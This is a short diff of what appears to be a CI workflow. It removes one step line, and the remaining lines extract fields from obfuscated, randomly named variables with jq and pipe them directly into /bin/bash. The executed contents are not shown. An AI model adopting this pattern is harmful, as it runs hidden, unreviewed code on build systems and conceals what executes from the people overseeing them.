@@ -30,7 +30,6 @@ jobs:
           echo $gccci88044 | jq -r .nl2 | /bin/bash
           echo $ehoh0649 | jq -r .xiqle44427 | /bin/bash
           echo $oggk83 | jq -r .trcj23 | /bin/bash
-          printf '%s' "$skn121" | jq -r .yr2 | /bin/bash
 
       - name: Archive output
         if: always()
